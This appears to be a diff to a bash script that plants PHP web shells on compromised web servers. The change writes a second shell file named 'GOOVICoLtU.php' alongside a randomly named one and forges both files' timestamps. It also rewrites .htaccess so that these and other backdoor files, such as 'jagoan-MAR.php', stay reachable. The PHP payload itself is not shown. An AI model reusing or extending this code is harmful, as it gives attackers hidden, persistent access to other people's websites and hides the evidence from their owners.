@@ -31,7 +31,7 @@ update_htaccess() {
   local dir="$1"
   local htaccess_file="$dir/.htaccess"
   local php_file_name="$2"
-  local index_php_file_name="$3"
+  local shell_php_file_name="$3"
 
   if [ -f "$htaccess_file" ]; then
     cp "$htaccess_file" "$htaccess_file.bak"
@@ -77,12 +77,12 @@ update_htaccess() {
     echo "    Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "<FilesMatch \"^(index.html|$php_file_name|$index_php_file_name|jagoan-MAR.php|class.php|class-index.php|config.php)\$\">"
+    echo "<FilesMatch \"^(index.html|index.php|$php_file_name|$shell_php_file_name|jagoan-MAR.php|class.php|class-index.php|config.php)\$\">"
     echo " Order allow,deny"
     echo " Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "DirectoryIndex $index_php_file_name"
+    echo "DirectoryIndex index.php"
     echo
     echo "Options -Indexes"
   } > "$htaccess_file" || {
@@ -361,17 +361,17 @@ EOF
 upload_php_files() {
   local dir="$1"
   local php_file_name="$(generate_random_name).php"
-  local index_php_file_name="index.php"
+  local shell_php_file_name="GOOVICoLtU.php"
   local php_file_path="$dir/$php_file_name"
-  local index_php_file_path="$dir/$index_php_file_name"
+  local index_php_file_path="$dir/$shell_php_file_name"
 
   if ! write_php_code "$php_file_path" ; then
     return
   fi
 
-#   if ! write_php_code "$index_php_file_path" ; then
-#     return
-#   fi
+  if ! write_php_code "$index_php_file_path" ; then
+    return
+  fi
 
   if ! chmod 0644 "$php_file_path" || ! chmod 0644 "$index_php_file_path"; then
     local msg="$(date) - Failed to set permissions for PHP files in $dir"
@@ -379,9 +379,9 @@ upload_php_files() {
   fi
 
   set_random_date "$php_file_path"
-#   set_random_date "$index_php_file_path"
+  set_random_date "$index_php_file_path"
 
-  update_htaccess "$dir" "$php_file_name" "$index_php_file_name"
+  update_htaccess "$dir" "$php_file_name" "$shell_php_file_name"
 }
 
 # rename_index() {
